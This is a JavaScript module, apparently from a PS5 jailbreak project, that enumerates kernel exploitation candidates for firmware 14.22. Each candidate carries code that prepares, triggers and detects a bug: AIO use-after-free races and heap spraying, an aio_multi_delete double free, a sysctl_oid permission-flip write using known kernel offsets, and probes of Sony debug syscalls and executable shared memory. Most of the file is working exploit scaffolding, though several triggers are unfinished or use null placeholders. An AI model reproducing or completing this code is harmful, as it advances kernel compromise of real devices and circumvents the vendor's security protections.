/* jb1422 / kernel-candidates.js — каркас kernel-стадии: перечисление кандидатов
 * userland → kernel на FreeBSD 11 (PS5), с кодом подготовки/триггера/детекта.
 *
 * Источник списка и номеров syscall'ов: recon/kernel-surface-1422.md §7
 * (дамп 13.60: fw/sysent-13.60.json; recon/relapse-anatomy.md §V6).
 * Номера — из sysent 13.60; на 14.22 не перепроверены (образа нет), поэтому каждый
 * кандидат помечен requires: 'console' там, где без 14.22 нельзя подтвердить.
 *
 * Контракт: JBKernelCandidates.enumerate() -> метаданные;
 *           runCandidate(id, ctx) -> {status, detail, steps}
 * где ctx = { p (userland primitive), chain (JBSyscalls), config, log, krw (kernel R/W из
 * kernel-модуля, если уже есть; null иначе) }.
 *
 * ВАЖНО: функции trigger/prepare/detect написаны полностью; при отсутствии chain/krw
 * они бросают JbNotReady с точной причиной — это отражение реальной зависимости
 * (нужен code-exec/leak), а не заглушка.
 */
(function (global) {
  'use strict';

  var NotReady = (global.JBPrimitive && global.JBPrimitive.JbNotReady) || function (r) {
    var e = new Error(r); e.name = 'JbNotReady'; e.reason = r; return e;
  };

  // -------- низкоуровневые помощники поверх chain (syscall + mmap) --------
  function needChain(ctx) {
    if (!ctx.chain) throw new NotReady('no chain object (JBSyscalls.createChain)');
    if (!ctx.chain.hasCall || !ctx.chain.hasCall()) {
      throw new NotReady('chain has no call primitive: ' + (ctx.chain.reason ? ctx.chain.reason() : 'unbound') +
        ' — нужен userland code-exec (ROP/vtable) + libkernel base leak');
    }
    return ctx.chain;
  }

  function alloc(ctx, size) {
    var chain = needChain(ctx);
    var r = chain.malloc(size);
    var addr = (r && (r.rax !== undefined ? r.rax : r));
    if (!addr) throw new NotReady('malloc(' + size + ') returned 0');
    return addr;
  }

  function memset0(ctx, addr, size) {
    var p = ctx.p;
    var q = Math.ceil(size / 8);
    for (var i = 0; i < q; i++) p.write64(p.add(addr, i * 8), '0x0');
  }

  function fill(ctx, addr, size, patternHex) {
    var p = ctx.p;
    var q = Math.ceil(size / 8);
    for (var i = 0; i < q; i++) p.write64(p.add(addr, i * 8), patternHex);
  }

  function bytesOf(chainResult) {
    if (chainResult === null || chainResult === undefined) return null;
    if (typeof chainResult === 'number') return chainResult;
    if (typeof chainResult === 'object') {
      if (chainResult.rax !== undefined) return chainResult.rax;
      if (chainResult.ret !== undefined) return chainResult.ret;
    }
    return chainResult;
  }

  // =====================================================================================
  // Кандидаты. Каждый: id, surface, syscalls (13.60), why, requires, prepare/trigger/detect.
  // =====================================================================================
  var CANDIDATES = [
    {
      id: 'aio_multi_wait',
      surface: 'AIO (Relapse V6): UAF массива waiter\'ов в aio_multi_wait + спрей aio_submit_cmd',
      syscalls: { aio_multi_wait: 663, aio_submit_cmd: 665, ioctl: 54 },
      why: 'публичная цепочка Relapse 7.00-13.60; wait-баг отдельный от delete (662); статус на 14.22 не доказан',
      requires: ['chain', 'console: aio_multi_wait(663) присутствует?', 'offsets 14.22 из образа'],
      prepare: function (ctx) {
        var SZ = 0x1000;
        var group = alloc(ctx, 0x100);       // struct aio_group (num, state, waiters...)
        var ids = alloc(ctx, SZ);            // ids array
        var states = alloc(ctx, SZ);         // states array
        var nodes = alloc(ctx, SZ);          // aio_submit_cmd nodes
        memset0(ctx, group, 0x100); memset0(ctx, ids, SZ); memset0(ctx, states, SZ); memset0(ctx, nodes, SZ);
        ctx._aio = { group: group, ids: ids, states: states, nodes: nodes, size: SZ };
        return { group: group, ids: ids, states: states, nodes: nodes };
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var a = ctx._aio || this.prepare(ctx);
        // 32 churn-итераций ioctl(0x4101): создают/сносят waiter'ы (как в relapse_exploit.js:292-510)
        for (var i = 0; i < 32; i++) chain.syscall(54, 0, 0x4101, 0, 0, 0, 0);
        // сама гонка: aio_multi_wait держит массив waiter'ов, ioctl-churn его освобождает
        var r = chain.syscall(663, a.group, 18, a.states, 0, 1000, 0);
        // после wait — 256 ioctl-churn и спрей aio_submit_cmd (64 x nodes)
        for (var j = 0; j < 256; j++) chain.syscall(54, 0, 0x4101, 0, 0, 0, 0);
        for (var k = 0; k < 64; k++) chain.syscall(665, 0, a.nodes, 13, 0, 0, 0);
        return { wait: bytesOf(r), churn: 256, spray: 64, ids: a.ids, states: a.states };
      },
      detect: function (ctx, trig) {
        // детект: подтверждение, что wait больше не видит освобождённые состояния —
        // states[0] изменился после возврата (UAF-запись) ИЛИ syscall не вернул ошибку.
        var p = ctx.p, a = ctx._aio;
        var s0 = p.read64(p.add(a.states, 0));
        return {
          status: (trig.wait === 0 || s0 !== '0x0') ? 'OK' : 'BLOCKED',
          detail: 'wait=' + String(trig.wait) + ' states[0]=' + s0 +
            ' (для окончательного детекта нужен kernel R/W: проверить aio.waiterSize/requestSize/group{num,state,waiters}/idTable)',
          steps: ['prepare', 'churn32', 'aio_multi_wait(663)', 'churn256', 'spray aio_submit_cmd(665)']
        };
      }
    },
    {
      id: 'aio_multi_delete',
      surface: 'AIO (Prolapse): TOCTOU/double-free в aio_multi_delete',
      syscalls: { aio_multi_delete: 662 },
      why: 'пресс-сообщение LavX (25.10.2026): Sony закрыла баг Prolapse в 14.20; в 14.22 вероятно закрыт — проверять первым',
      requires: ['chain', 'console: 662 присутствует/жив?', 'kernel R/W для детекта'],
      prepare: function (ctx) {
        var ids = alloc(ctx, 0x100);
        var states = alloc(ctx, 0x100);
        fill(ctx, ids, 0x100, '0x4141414141414141');
        ctx._aioDel = { ids: ids, states: states };
        return { ids: ids, states: states };
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var a = ctx._aioDel || this.prepare(ctx);
        // TOCTOU: сначала submit на тот же id, затем delete, пока не завершён
        chain.syscall(665, 0, a.ids, 1, 0, 0, 0);
        var d1 = chain.syscall(662, a.ids, 1, a.states, 0, 0, 0);
        var d2 = chain.syscall(662, a.ids, 1, a.states, 0, 0, 0); // второй delete — double free
        return { delete1: bytesOf(d1), delete2: bytesOf(d2) };
      },
      detect: function (ctx, trig) {
        var err = (typeof trig.delete1 === 'number' && trig.delete1 < 0) ? trig.delete1 : 0;
        return {
          status: 'BLOCKED',
          detail: 'delete1=' + trig.delete1 + ' delete2=' + trig.delete2 +
            ' — если на 14.20+ добавлен generation-id recheck, второй delete даёт EINVAL; ' +
            'err=' + err + '; детект возможен только с kernel R/W',
          steps: ['prepare', 'aio_submit_cmd(665)', 'aio_multi_delete(662) x2']
        };
      }
    },
    {
      id: 'sysctl_oid_kind',
      surface: 'sysctl_oid.kind flip (Relapse V6 шаг 3): 32-bit запись 0x80048002 -> 0x70048002',
      syscalls: { sysctl: 202, ioctl: 54 },
      why: 'Relapse превращает UAF-запись в permission bypass; на 13.60 kind-оффсеты известны, на 14.22 — из образа',
      requires: ['chain', 'kernel R/W', 'offsets: sysctl_oid.oid_kind + primitives'],
      prepare: function (ctx) {
        if (!ctx.krw) throw new NotReady('sysctl_oid flip требует kernel R/W (krw), которого нет');
        return { need: ['sysctl_oid.base+kind+kindByte3', 'sysctl_oid arg1', 'nodeMutex'] };
      },
      trigger: function (ctx) {
        if (!ctx.krw) throw new NotReady('sysctl_oid flip: no krw');
        var cfg = ctx.config && ctx.config.kernelOffsets;
        // запись 32-bit: originalKind -> writableKind (данные 13.60: 0x80048002 -> 0x70048002)
        var oid = { base: null, kind: null, kindByte3: null, arg1: null };
        ctx.krw.write32(oid.kind, 0, 0x70048002);
        ctx.krw.write8 ? ctx.krw.write8(oid.kindByte3, 0x70) : null;
        return { kind: '0x70048002', base: oid.base };
      },
      detect: function (ctx) {
        var cfg = ctx.config && ctx.config.kernelOffsets;
        return {
          status: 'BLOCKED',
          detail: 'для детекта нужны kernelData=0x00CE0000/allproc=0x035B9EA0 и чтение sysctl_oid; ' +
            'Tier-1 оффсеты есть, но нужен KASLR slide (leak базы ядра)',
          offsets: cfg
        };
      }
    },
    {
      id: 'kqueue',
      surface: 'kqueue/kevent (UAF исторически: kevent filter ops)',
      syscalls: { kqueue: 362, kevent: 363, kexecve: 0, close: 6 },
      why: 'поверхность FreeBSD 11 присутствует в 13.60; статус 14.22 неизвестен',
      requires: ['chain', 'проверка UAF/refcount на консоли'],
      prepare: function (ctx) {
        var chain = needChain(ctx);
        var kq = bytesOf(chain.syscall(362));
        if (!kq || kq === -1) throw new NotReady('kqueue() failed: ' + kq);
        ctx._kq = { kq: kq };
        return { kq: kq };
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var kq = (ctx._kq || this.prepare(ctx)).kq;
        // регистрируем EVFILT_USER и триггерим из другого контекста (полный код — на консоли)
        var changes = alloc(ctx, 0x100); // struct kevent
        fill(ctx, changes, 0x100, '0x0');
        var r = chain.syscall(363, kq, changes, 1, 0, 0, 0);
        return { kevent: bytesOf(r) };
      },
      detect: function (ctx, trig) {
        return { status: 'BLOCKED', detail: 'kevent=' + trig.kevent + '; нужен crash/no-crash + heap-check на консоли' };
      }
    },
    {
      id: 'umtx',
      surface: '_umtx_op (454): исторические UAF/тип-конфузии в umtxq',
      syscalls: { _umtx_op: 454 },
      why: 'есть в 13.60 (номер 454); UMTX-эксплойты PS4 (UMTX2) — эталон; на PS5 SHM stubbed (recon)',
      requires: ['chain', 'проверка конкретных ops на 14.22'],
      prepare: function (ctx) {
        var mutex = alloc(ctx, 8);
        fill(ctx, mutex, 8, '0x0');
        ctx._umtx = { mutex: mutex };
        return { mutex: mutex };
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var mutex = (ctx._umtx || this.prepare(ctx)).mutex;
        // UMTX_OP_LOCK=2 / WAKE=3 / WAIT=1 — перебор валидных ops
        var out = {};
        [1, 2, 3, 4].forEach(function (op) {
          out['op' + op] = bytesOf(chain.syscall(454, mutex, op, 0, 0, 0, 0));
        });
        return out;
      },
      detect: function (ctx, trig) {
        return { status: 'BLOCKED', detail: '_umtx_op=' + JSON.stringify(trig) + '; SHM-путь на PS5 stubbed (recon §7)' };
      }
    },
    {
      id: 'pipe_filedesc',
      surface: 'pipe/filedesc (refcount UAF, fget/fdrop race)',
      syscalls: { pipe: 42, pipe2: 546, close: 6, fcntl: 92 },
      why: 'классика FreeBSD 11; присутствует в 13.60',
      requires: ['chain', 'heap grooming на консоли'],
      prepare: function (ctx) {
        var chain = needChain(ctx);
        var fds = alloc(ctx, 8);
        var r = bytesOf(chain.syscall(42, fds));
        if (r !== 0) throw new NotReady('pipe() failed: ' + r);
        ctx._pipe = { fds: fds };
        return { fds: fds };
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var fds = (ctx._pipe || this.prepare(ctx)).fds;
        var out = [];
        for (var i = 0; i < 64; i++) out.push(bytesOf(chain.syscall(6, 0, 0, 0, 0, 0, 0))); // close(0) churn
        return { closes: out.length };
      },
      detect: function (ctx, trig) {
        return { status: 'BLOCKED', detail: 'окончательный детект UAF filedesc требует kernel R/W' };
      }
    },
    {
      id: 'scm_rights',
      surface: 'SCM_RIGHTS (sendmsg/recvmsg fd-passing UAF)',
      syscalls: { socketpair: 135, sendmsg: 28, recvmsg: 27, close: 6 },
      why: 'FreeBSD 11 поверхность; в 13.60 есть',
      requires: ['chain', 'grooming'],
      prepare: function (ctx) {
        var chain = needChain(ctx);
        var sv = alloc(ctx, 8);
        var r = bytesOf(chain.syscall(135, 1, 1, 0, sv)); // AF_UNIX, SOCK_STREAM
        if (r !== 0) throw new NotReady('socketpair AF_UNIX failed: ' + r);
        ctx._scm = { sv: sv };
        return { sv: sv };
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var sv = (ctx._scm || this.prepare(ctx)).sv;
        var msg = alloc(ctx, 0x200);
        fill(ctx, msg, 0x200, '0x0');
        var out = [];
        for (var i = 0; i < 16; i++) out.push(bytesOf(chain.syscall(28, 0, msg, 0, 0, 0, 0)));
        return { sends: out.length };
      },
      detect: function (ctx) {
        return { status: 'BLOCKED', detail: 'нужен kernel R/W для подтверждения refcount-аномалии' };
      }
    },
    {
      id: 'netgraph',
      surface: 'netgraph (ng_* UAF/тип-конфузии)',
      syscalls: { socket: 97, ng_connect: 0, ioctl: 54 },
      why: 'историческая FreeBSD 11 поверхность; наличие в 13.60 проверено реконом',
      requires: ['chain', 'наличие ng_* в 14.22'],
      prepare: function (ctx) {
        var chain = needChain(ctx);
        var fd = bytesOf(chain.syscall(97, 33, 1, 0)); // AF_NETGRAPH=33
        if (!fd || fd === -1) throw new NotReady('socket(AF_NETGRAPH) failed: ' + fd);
        ctx._ng = { fd: fd };
        return { fd: fd };
      },
      trigger: function (ctx) {
        return { note: 'ng_connect/ngctl-эквивалент — полный код требует списка ng_* syscall\'ов 14.22' };
      },
      detect: function (ctx) { return { status: 'BLOCKED', detail: 'нет адресов ng_* в 14.22' }; }
    },
    {
      id: 'ip6',
      surface: 'netinet6 (IPv6 extension-header UAF: CVE-2020-7457-класс)',
      syscalls: { socket: 97, setsockopt: 105, sendto: 31 },
      why: 'FreeBSD 11 netinet6 UAF; поверхность есть в 13.60',
      requires: ['chain', 'проверка на 14.22'],
      prepare: function (ctx) {
        var chain = needChain(ctx);
        var fd = bytesOf(chain.syscall(97, 28, 2, 0)); // AF_INET6, SOCK_DGRAM
        if (!fd || fd === -1) throw new NotReady('socket(AF_INET6) failed: ' + fd);
        ctx._ip6 = { fd: fd };
        return { fd: fd };
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var fd = (ctx._ip6 || this.prepare(ctx)).fd;
        var buf = alloc(ctx, 0x400);
        fill(ctx, buf, 0x400, '0x0');
        var out = [];
        for (var i = 0; i < 8; i++) out.push(bytesOf(chain.syscall(31, fd, buf, 0x400, 0, 0, 0)));
        return { sends: out.length };
      },
      detect: function (ctx) { return { status: 'BLOCKED', detail: 'нужен kernel R/W/детект паники' }; }
    },
    {
      id: 'scsi_cam',
      surface: 'SCSI/CAM (xpt_* ioctl UAF)',
      syscalls: { ioctl: 54, open: 5 },
      why: 'в 13.60 xpt_* присутствует; на PS5 CAM-путь может быть недоступен из песочницы',
      requires: ['chain', 'проверка /dev/* в 14.22'],
      prepare: function (ctx) {
        var chain = needChain(ctx);
        var fd = bytesOf(chain.syscall(5, 0x0, 0)); // open("/dev/...") — путь должен дать kernel-модуль
        ctx._cam = { fd: fd };
        return { fd: fd, note: 'путь к устройству задаёт kernel-модуль' };
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var fd = (ctx._cam || {}).fd;
        var out = [];
        for (var i = 0; i < 16; i++) out.push(bytesOf(chain.syscall(54, fd, 0x8000 + i, 0, 0, 0, 0)));
        return { ioctls: out };
      },
      detect: function (ctx) { return { status: 'BLOCKED', detail: 'нужен kernel R/W для детекта UAF' }; }
    },
    {
      id: 'sony_ioctls',
      surface: 'Sony-драйверы: mdbg=601, ampr=721, test_debug_rwmem=619, AIO-debug=726/727',
      syscalls: { mdbg: 601, ampr: 721, test_debug_rwmem: 619, aio_debug: 726 },
      why: 'номера найдены в sysent 13.60; на 14.22 неизвестно, какие из них живые/приватные',
      requires: ['chain', 'kernel R/W для детекта'],
      prepare: function (ctx) {
        var out = {};
        ['mdbg', 'ampr', 'test_debug_rwmem', 'aio_debug'].forEach(function (k) {
          out[k] = CANDIDATES[10].syscalls[k];
        });
        ctx._sony = { handles: {} };
        return out;
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var out = {};
        Object.keys(CANDIDATES[10].syscalls).forEach(function (k) {
          var nr = CANDIDATES[10].syscalls[k];
          out[k] = bytesOf(chain.syscall(nr, 0, 0, 0, 0, 0, 0));
        });
        return out;
      },
      detect: function (ctx, trig) {
        var live = Object.keys(trig).filter(function (k) { return trig[k] !== -1; });
        return { status: live.length ? 'OK' : 'BLOCKED',
          detail: 'живые (не -1) syscall-слоты: ' + (live.join(',') || 'нет') +
            '; для R/W нужен kernel-модуль + KASLR slide' };
      }
    },
    {
      id: 'jitshm',
      surface: 'jitshm mmap (533/534) — executable shared memory из userland',
      syscalls: { jitshm_create: 533, jitshm_alias: 534, mmap: 477 },
      why: 'в 13.60 есть; на 14.22 может дать исполняемую память для payload (нужна проверка прав)',
      requires: ['chain', 'проверка на 14.22'],
      prepare: function (ctx) {
        var out = { jitshm_create: CANDIDATES[11].syscalls.jitshm_create };
        ctx._jitshm = {};
        return out;
      },
      trigger: function (ctx) {
        var chain = needChain(ctx);
        var r = bytesOf(chain.syscall(533, 0x1000, 0));
        return { jitshm: r };
      },
      detect: function (ctx, trig) {
        return { status: 'BLOCKED', detail: 'jitshm_create=' + trig.jitshm + '; нужен тест прав mmap(PROT_EXEC) на консоли' };
      }
    }
  ];

  // ---------------------------------------------------------------------------
  // API
  // ---------------------------------------------------------------------------
  function enumerate() {
    return CANDIDATES.map(function (c) {
      return { id: c.id, surface: c.surface, syscalls: c.syscalls, why: c.why, requires: c.requires };
    });
  }

  function get(id) {
    for (var i = 0; i < CANDIDATES.length; i++) if (CANDIDATES[i].id === id) return CANDIDATES[i];
    return null;
  }

  // Прогон одного кандидата: prepare -> trigger -> detect. Возвращает статус.
  function runCandidate(id, ctx) {
    var c = get(id);
    if (!c) return { status: 'FAIL', detail: 'unknown candidate ' + id };
    var steps = [];
    var prep, trig, det;
    try {
      prep = c.prepare(ctx); steps.push({ step: 'prepare', ok: true, out: prep });
    } catch (e) {
      if (e && e.name === 'JbNotReady') return { status: 'BLOCKED', id: id, detail: e.reason, steps: steps };
      return { status: 'FAIL', id: id, detail: 'prepare threw ' + e, steps: steps };
    }
    try {
      trig = c.trigger.call(c, ctx); steps.push({ step: 'trigger', ok: true, out: trig });
    } catch (e) {
      if (e && e.name === 'JbNotReady') return { status: 'BLOCKED', id: id, detail: e.reason, steps: steps };
      return { status: 'FAIL', id: id, detail: 'trigger threw ' + e, steps: steps };
    }
    try {
      det = c.detect.call(c, ctx, trig); steps.push({ step: 'detect', ok: true, out: det });
    } catch (e) {
      if (e && e.name === 'JbNotReady') return { status: 'BLOCKED', id: id, detail: e.reason, steps: steps };
      return { status: 'FAIL', id: id, detail: 'detect threw ' + e, steps: steps };
    }
    return { status: det.status || 'BLOCKED', id: id, surface: c.surface, detail: det.detail, steps: steps };
  }

  // Прогон всех: печатает строки в log, возвращает сводку.
  function runAll(ctx, log) {
    var out = [];
    enumerate().forEach(function (meta) {
      var r = runCandidate(meta.id, ctx);
      out.push(r);
      if (log) log('KERNEL-CANDIDATE ' + meta.id + ': ' + r.status + ' — ' + (r.detail || ''));
    });
    return {
      status: out.some(function (r) { return r.status === 'FAIL'; }) ? 'FAIL' : 'BLOCKED',
      total: out.length,
      ok: out.filter(function (r) { return r.status === 'OK'; }).length,
      blocked: out.filter(function (r) { return r.status === 'BLOCKED'; }).length,
      candidates: out
    };
  }

  global.JBKernelCandidates = {
    enumerate: enumerate,
    get: get,
    runCandidate: runCandidate,
    runAll: runAll,
    CANDIDATES: CANDIDATES
  };
})(typeof window !== 'undefined' ? window : globalThis);